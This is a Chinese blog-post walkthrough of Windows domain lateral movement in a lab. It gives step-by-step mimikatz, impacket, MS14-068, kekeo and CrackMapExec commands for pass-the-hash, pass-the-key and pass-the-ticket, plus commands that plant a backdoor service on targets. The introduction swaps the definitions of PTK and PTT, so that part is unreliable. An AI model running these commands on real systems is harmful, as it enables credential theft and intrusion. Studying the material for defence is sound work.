@@ -1,0 +1,619 @@
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="F4tty" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      内网横向移动(三)PTH&amp;PTT&amp;PTK 
+      
+      
+      |
+    
+     F4tty
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/img/favicon.ico">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/img/avatar.jpg" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">F4tty</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">主页</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">归档</a>
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          <a href="/categories/">分类</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">标签</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">友链</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">关于我</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">内网横向移动(三)PTH&PTT&PTK</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+          2022-10-01 00:00:00
+        </span>
+        
+              <span class="post-categories">
+                <i class="iconfont icon-bookmark" title="分类"></i>
+                
+                <span class="span--category">
+                  <a href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" title="内网安全">
+                    <b>#</b> 内网安全
+                  </a>
+                </span>
+                
+              </span>
+          
+              <span class="post-tags">
+                <i class="iconfont icon-tags mr-10" title="标签"></i>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/%E5%86%85%E7%BD%91/" title="内网">
+                    #内网
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h1 id="内网横向移动-三-PTH-amp-PTT-amp-PTK"><a href="#内网横向移动-三-PTH-amp-PTT-amp-PTK" class="headerlink" title="内网横向移动(三)PTH&amp;PTT&amp;PTK"></a>内网横向移动(三)PTH&amp;PTT&amp;PTK</h1><h2 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h2><p><img src="/posts/b0cb9aff/1664590631667-13a73e03-1b19-4318-9d84-be23d45b95b1.png" alt="bfl2kYExirJ2o8jENtd6_g.png"><br><img src="/posts/b0cb9aff/1664590640844-ae091338-93fe-4eaf-8cbe-5fcf543e2f61.png" alt="image-20221001092803141.png"><br>已经拿下webserver并且已提权<br>信息搜集已完成<br><img src="/posts/b0cb9aff/1664590644692-a7aff714-0d37-4cad-b0a6-a37cc6229d2f.png" alt="image-20221001101059993.png"><br><img src="/posts/b0cb9aff/1664590650240-4dc5af18-52c7-46af-92cc-1bb8d6a14a33.png" alt="image-20221001101117535.png"></p>
+<h2 id="简单了解PTH-amp-PTK-amp-PTT"><a href="#简单了解PTH-amp-PTK-amp-PTT" class="headerlink" title="简单了解PTH&amp;PTK&amp;PTT"></a>简单了解PTH&amp;PTK&amp;PTT</h2><p>pass the hash（哈希传递攻击，简称PTH）	利用的lm或ntlm的值进行的渗透测试（NTLM认证攻击）<br>pass the ticket（票据传递攻击，简称PTK）  利用的ekeys aes256进行的渗透测试（NTLM认证攻击）<br>pass the key（密钥传递攻击，简称PTT）	 利用的票据凭证TGT进行渗透测试（Kerberos认证攻击）</p>
+<h2 id="PTH-Mimikatz-amp-NTLM"><a href="#PTH-Mimikatz-amp-NTLM" class="headerlink" title="PTH-Mimikatz&amp;NTLM"></a>PTH-Mimikatz&amp;NTLM</h2><p>PTH &#x3D; Pass The Hash，通过密码散列值 (通常是NTLM Hash)来进行攻击。<br>在域环境中，用户登录计算机时使用的域账号，计算机会用相同本地管理员账号和密码。<br>因此，如果计算机的本地管理员账号和密码也是相同的，攻击者就可以使用哈希传递的方法登录到内网主机的其他计算机。另外注意在Window Server 2012 R2之前使用到的密码散列值是LM Hash，在2012 R2及其版本之后使用到的密码散列值是NTLM Hash。也就是如果对Window Server 2012 R2之前的版本进行渗透需要使用的是LM Hash<br><img src="/posts/b0cb9aff/1664590660969-02a98b3d-dceb-43d6-80aa-f0ed9812771b.png" alt="image-20221001095803479.png"></p>
+<h3 id="1、Mimikatz"><a href="#1、Mimikatz" class="headerlink" title="1、Mimikatz"></a>1、Mimikatz</h3><p>利用</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimikatz privilege::debug</span><br><span class="line">mimikatz sekurlsa::pth /user:administrator /domain:192.168.3.32 /ntlm:518b98ad4178a53695dc997aa02d455c</span><br></pre></td></tr></table></figure>
+<p>执行完成后在主机弹出一个cmd窗口<br><img src="/posts/b0cb9aff/1664590669515-9b811fa9-c480-4a09-9ecb-7e9168ae96f1.png" alt="image-20221001101248997.png"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.3.32\c$</span><br><span class="line">dir \\192.168.3.32\c$</span><br></pre></td></tr></table></figure>
+<p><img src="/posts/b0cb9aff/1664590678773-60b7d7c0-d02f-4579-b68e-6b330e90e49d.png" alt="image-20221001101418441.png"><br>利用转发上线,把后门上传到webserver然后利用以下命令上传到目标然后执行上线</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">copy C:\Users\webadmin\Desktop\zf.exe \\192.168.3.32\c$</span><br><span class="line">sc \\sqlserver create bshell binpath= &quot;c:\zf.exe&quot; #sqlserver是192.168.3.32的主机名字可换为ip地址</span><br><span class="line">sc \\sqlserver start bshell </span><br></pre></td></tr></table></figure>
+<p><img src="/posts/b0cb9aff/1664591628278-cd66e3fa-cf04-4ea0-a4c2-805ae255afed.png" alt="image.png"><br>成功上线</p>
+<h3 id="2、impacket-at-amp-ps-amp-wmi-amp-smb"><a href="#2、impacket-at-amp-ps-amp-wmi-amp-smb" class="headerlink" title="2、impacket-at&amp;ps&amp;wmi&amp;smb"></a>2、impacket-at&amp;ps&amp;wmi&amp;smb</h3><p>CS利用webserver开启socks代理然后用Proxifier连接代理<br><img src="/posts/b0cb9aff/1664591828118-6532749c-ebc9-4121-a874-fc1caf1a670a.png" alt="image.png"><br>以下工具均在impacket套件中，根据协议开放三选一即可<br>exe版本</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">psexec</span></span><br><span class="line">psexec -hashes :NTLM值 域名/域用户@域内ip地址</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">smbexec</span></span><br><span class="line">smbexec -hashes :NTLM值 域名/域用户@域内ip地址</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">wmiexec</span></span><br><span class="line">wmiexec -hashes :NTLM值 域名/域用户@域内ip地址</span><br></pre></td></tr></table></figure>
+<p>python版本</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">psexec</span></span><br><span class="line">python psexec.py -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">smbexec</span></span><br><span class="line">python smbexec.py -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">wmiexec</span></span><br><span class="line">python wmiexec.py -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32</span><br></pre></td></tr></table></figure>
+<p>执行结束后会返回一个cmd会话<br><img src="/posts/b0cb9aff/1664592072918-4bf51e93-a00b-401e-a79b-498f29d12573.png" alt="image.png"><br><img src="/posts/b0cb9aff/1664592131849-b560c575-38e6-4470-9385-b33cbdc6455c.png" alt="image.png"><br>后续上线方法:将后门上传到webserver的web目录，然后利用cmd会话下载后门然后执行(具体操作见前篇)<br>三个工具都是返回cmd会话，操作相同</p>
+<h2 id="PTK-Mimikatz-amp-AES256"><a href="#PTK-Mimikatz-amp-AES256" class="headerlink" title="PTK-Mimikatz&amp;AES256"></a>PTK-Mimikatz&amp;AES256</h2><p>PTK &#x3D; Pass The Key，当系统安装了KB2871997补丁且禁用了NTLM的时候，<br>那我们抓取到的ntlm hash也就失去了作用，但是可以通过PTK的攻击方式获得权限。<br>利用方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimikatz sekurlsa::ekeys</span><br><span class="line">mimikatz sekurlsa::pth /user:域用户名 /domain:域名 /aes256:aes256值</span><br></pre></td></tr></table></figure>
+<p>由于环境不允许无法复现</p>
+<h2 id="PTT-漏洞-amp-Kekeo-amp-Ticket"><a href="#PTT-漏洞-amp-Kekeo-amp-Ticket" class="headerlink" title="PTT-漏洞&amp;Kekeo&amp;Ticket"></a>PTT-漏洞&amp;Kekeo&amp;Ticket</h2><p><a target="_blank" rel="noopener" href="https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068">https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068</a><br><a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/kekeo/releases">https://github.com/gentilkiwi/kekeo/releases</a></p>
+<h3 id="1、MS14068-webadmin权限"><a href="#1、MS14068-webadmin权限" class="headerlink" title="1、MS14068(webadmin权限)"></a>1、MS14068(webadmin权限)</h3><blockquote>
+<p><strong>利用漏洞生成的用户的新身份票据尝试认证</strong></p>
+</blockquote>
+<p>MS14-068是密钥分发中心（KDC）服务中的Windows漏洞。<br>它允许经过身份验证的用户在其Kerberos票证（TGT）中插入任意PAC。<br>该漏洞位于kdcsvc.dll域控制器的密钥分发中心(KDC)中。<br>用户可以通过呈现具有改变的PAC的Kerberos TGT来获得票证.<br>简单来说就是伪造用户身份,类似cookie伪造，只要是域内用户就可以<br>获取SID值：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell whoami/user</span><br></pre></td></tr></table></figure>
+<p><img src="/posts/b0cb9aff/1664593480957-4f7a00af-b16e-4384-bb62-6bf1e308abe6.png" alt="image.png"><br>生成票据文件：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell ms14-068.exe -u webadmin@god.org -s S-1-5-21-1218902331-2157346161-1782232778-1132 -d 192.168.3.21 -p admin!@#45</span><br></pre></td></tr></table></figure>
+<p><img src="/posts/b0cb9aff/1664593623202-c6794fdb-7a58-4a85-b477-80922a2847cb.png" alt="image.png"><br><img src="/posts/b0cb9aff/1664593642112-4a75aa17-5cea-43c3-b72e-83485cc2c4e6.png" alt="image.png"><br>清除票据连接：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell klist purge</span><br></pre></td></tr></table></figure>
+<p><img src="/posts/b0cb9aff/1664593684804-6dbc7024-f97c-40bb-a1d0-2d3be9a9948d.png" alt="image.png"><br>把生成的票据文件上传到webserver<br><img src="/posts/b0cb9aff/1664593747716-ad567511-895c-48de-9281-f1732dcfd13c.png" alt="image.png"><br>内存导入票据：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::ptc TGT_webadmin@god.org.ccache</span><br></pre></td></tr></table></figure>
+<p><img src="/posts/b0cb9aff/1664593800849-b3f3ead2-e294-4695-baa8-afac6eb5579e.png" alt="image.png"><br><img src="/posts/b0cb9aff/1664593818520-b1f29128-73e2-42f0-b6f6-65bcf9ae9296.png" alt="image.png"><br>注意这里的开始和结束时间，只有在这个时间端内票据才是有效的<br>测试连接：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">注意这里要使用计算机名 使用ip地址可能出错</span></span><br><span class="line">shell dir \\OWA2010CN-GOD\c$</span><br><span class="line">shell net use \\OWA2010CN-GOD\C$</span><br></pre></td></tr></table></figure>
+<p><img src="/posts/b0cb9aff/1664594028087-6c0079b6-a49e-4518-9d2b-5f896c5656bb.png" alt="image.png"><br>上线</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shell copy C:\Users\webadmin\Desktop\zf.exe \\OWA2010CN-GOD\C$</span><br><span class="line">shell sc \\OWA2010CN-GOD create bindshell binpath= &quot;c:\zf.exe&quot;</span><br><span class="line">shell sc \\OWA2010CN-GOD start bindshell</span><br></pre></td></tr></table></figure>
+<p><img src="/posts/b0cb9aff/1664594110665-248b64a7-cf44-4236-b764-612599dc5270.png" alt="image.png"><br><img src="/posts/b0cb9aff/1664594118134-e7d259b7-db2f-4d23-a66b-8c34125b2e46.png" alt="image.png"><br>注意：成功不成功看DC域控漏洞补丁打没打</p>
+<h3 id="2、kekeo-高权限，需NTLM"><a href="#2、kekeo-高权限，需NTLM" class="headerlink" title="2、kekeo(高权限，需NTLM)"></a>2、kekeo(高权限，需NTLM)</h3><blockquote>
+<p><strong>利用获取的NTLM生成新的票据尝试认证</strong></p>
+</blockquote>
+<p>利用我们获取到NTLM重新生成一个票据然后再去连接<br>缺点：票据是有有效期的，所以如果当前主机在连接过域控的话，有效期内可利用。<br>先把kekeo.exe上传到webserver<br>生成票据：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">注意这里是利用域控的<span class="built_in">hash</span> 如果用普通成员的<span class="built_in">hash</span>无法成功 可以通过横向移动到其他主机拿到</span></span><br><span class="line">shell kekeo &quot;tgt::ask /user:Administrator /domain:god.org /ntlm:ccef208c6485269c20db2cad21734fe7&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>
+<p>导入票据：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell kekeo &quot;kerberos::ptt TGT_Administrator@GOD.ORG_krbtgt~god.org@GOD.ORG.kirbi&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>
+<p>查看票据：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell klist</span><br></pre></td></tr></table></figure>
+<p>利用票据连接：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell dir \\owa2010cn-god\c$</span><br></pre></td></tr></table></figure>
+<p><img src="/posts/b0cb9aff/1664600117220-4bb77a02-9509-4348-ab28-faabcb1298ea.png" alt="image.png"><br>注意：成功不成功看ntlm哈希值的正确性<br><strong>到这里可能会有疑问有了hash值为什么不用pth攻击呢?</strong><br>注意pth的利用前提是smb和wmi等协议是正常的,那么这些不正常的时候我们就可以利用ptt攻击来达到目的<br>一个是NTLM认证,一个是Kerberos认证</p>
+<h3 id="3、mimikatz-高权限-需Ticket"><a href="#3、mimikatz-高权限-需Ticket" class="headerlink" title="3、mimikatz(高权限,需Ticket)"></a>3、mimikatz(高权限,需Ticket)</h3><blockquote>
+<p><strong>利用历史遗留的票据重新认证尝试</strong></p>
+</blockquote>
+<p>域控与主机建立连接后生成的票据有效时间为10个小时，在这10个小时中拿到票据那么就可以利用mimikatz将票据导出然后再导入进行伪造。<br>导出票据：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz sekurlsa::tickets /export</span><br></pre></td></tr></table></figure>
+<p>导入票据：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">这里要选择管理员登录电脑后生成的票据</span></span><br><span class="line">mimikatz kerberos::ptt C:\Users\webadmin\Desktop\[0;687080]-2-0-40e00000-Administrator@krbtgt-god.org.kirbi</span><br></pre></td></tr></table></figure>
+<p>查看票据：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell klist</span><br></pre></td></tr></table></figure>
+<p>利用票据连接：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell dir \\owa2010cn-god\c$</span><br></pre></td></tr></table></figure>
+<p>注意：成功不成功看当前主机有没有被目标连接过<br><img src="/posts/b0cb9aff/1664608850615-84121039-14c8-4e88-af9c-eca4ef59414d.png" alt="image.png"></p>
+<h2 id="PTH-Proxychains-amp-CrackMapExec"><a href="#PTH-Proxychains-amp-CrackMapExec" class="headerlink" title="PTH-Proxychains&amp;CrackMapExec"></a>PTH-Proxychains&amp;CrackMapExec</h2><p>CrackMapExec<br>Github：<a target="_blank" rel="noopener" href="https://github.com/Porchetta-Industries/CrackMapExec">https://github.com/Porchetta-Industries/CrackMapExec</a><br>官方手册：<a target="_blank" rel="noopener" href="https://mpgn.gitbook.io/crackmapexec/">https://mpgn.gitbook.io/crackmapexec/</a><br>部分案例：<a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/184573.html">https://www.freebuf.com/sectool/184573.html</a><br>下载对应release，建立socks连接，设置socks代理，配置规则，调用！<br>详细配置可看上篇<br>1、Linux Proxychains使用<br>代理配置：Proxychains.conf<br>代理调用：Proxychains 命令<br>2、密码喷射-域用户登录PTH：<br>利用CrackMapExec对hash值进行验证</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">域用户HASH登录</span></span><br><span class="line">proxychains python cme smb 192.168.3.21-32 -u user.txt -H 518b98ad4178a53695dc997aa02d455c </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">本地用户HASH登录</span></span><br><span class="line">proxychains python cme smb 192.168.3.21-32 -u administrator -H 518b98ad4178a53695dc997aa02d455c --local-auth</span><br></pre></td></tr></table></figure>
+<p><img src="/posts/b0cb9aff/1664610207506-ad93ffcb-4e92-40d9-9dc8-a72b638a9dac.png" alt="image.png"><br><img src="/posts/b0cb9aff/1664609993691-b465b616-0829-4bac-933a-0cc1a5a57884.png" alt="image.png"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>PTH在内网渗透中是一种很经典的攻击方式，原理就是攻击者可以直接通过LM Hash和NTLM Hash访问远程主机或服务，而不用提供明文密码。<br>如果禁用了ntlm认证，PsExec无法利用获得的ntlm hash进行远程连接，但是使用mimikatz还是可以攻击成功。对于8.1&#x2F;2012r2，安装补丁kb2871997的Win 7&#x2F;2008r2&#x2F;8&#x2F;2012等，可以使用AES keys代替NT hash来实现ptk攻击,<br>打了KB2871997补丁后的影响</p>
+<ul>
+<li>pth：没打补丁用户都可以连接，打了补丁只能administrator连接</li>
+<li>ptk：打了补丁才能用户都可以连接，采用aes256连接</li>
+<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/column/220740.html">https://www.freebuf.com/column/220740.html</a></li>
+</ul>
+<p>PTT攻击的部分就不是简单的NTLM认证了，它是利用Kerberos协议进行攻击的，三种常见的攻击方法：MS14-068，Golden ticket，SILVER ticket，简单来说就是将连接合法的票据注入到内存中实现连接。<br>MS14-068基于漏洞，Golden ticket(黄金票据)，SILVER ticket(白银票据)<br>其中Golden ticket(黄金票据)，SILVER ticket(白银票据)属于权限维持技术<br>MS14-068造成的危害是允许域内任何一个普通用户，将自己提升至域管权限。微软给出的补丁是kb3011780。</p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/posts/82f7f61b/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>上一页</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+              2022-10-01 00:00:00
+            </span>
+            
+                  <span class="post-categories">
+                    <i class="iconfont icon-bookmark" title="分类"></i>
+                    
+                    <span class="span--category">
+                      <a href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" title="内网安全">
+                        <b>#</b> 内网安全
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags mr-10" title="标签"></i>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/%E5%86%85%E7%BD%91/" title="内网">
+                        #内网
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8-%E4%B8%89-PTH-amp-PTT-amp-PTK"><span class="toc-text">内网横向移动(三)PTH&amp;PTT&amp;PTK</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E4%BB%8B%E7%BB%8D"><span class="toc-text">环境介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E4%BA%86%E8%A7%A3PTH-amp-PTK-amp-PTT"><span class="toc-text">简单了解PTH&amp;PTK&amp;PTT</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PTH-Mimikatz-amp-NTLM"><span class="toc-text">PTH-Mimikatz&amp;NTLM</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81Mimikatz"><span class="toc-text">1、Mimikatz</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81impacket-at-amp-ps-amp-wmi-amp-smb"><span class="toc-text">2、impacket-at&amp;ps&amp;wmi&amp;smb</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PTK-Mimikatz-amp-AES256"><span class="toc-text">PTK-Mimikatz&amp;AES256</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PTT-%E6%BC%8F%E6%B4%9E-amp-Kekeo-amp-Ticket"><span class="toc-text">PTT-漏洞&amp;Kekeo&amp;Ticket</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81MS14068-webadmin%E6%9D%83%E9%99%90"><span class="toc-text">1、MS14068(webadmin权限)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81kekeo-%E9%AB%98%E6%9D%83%E9%99%90%EF%BC%8C%E9%9C%80NTLM"><span class="toc-text">2、kekeo(高权限，需NTLM)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E3%80%81mimikatz-%E9%AB%98%E6%9D%83%E9%99%90-%E9%9C%80Ticket"><span class="toc-text">3、mimikatz(高权限,需Ticket)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PTH-Proxychains-amp-CrackMapExec"><span class="toc-text">PTH-Proxychains&amp;CrackMapExec</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li></ol></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © 2022 Oranges</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="搜索...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
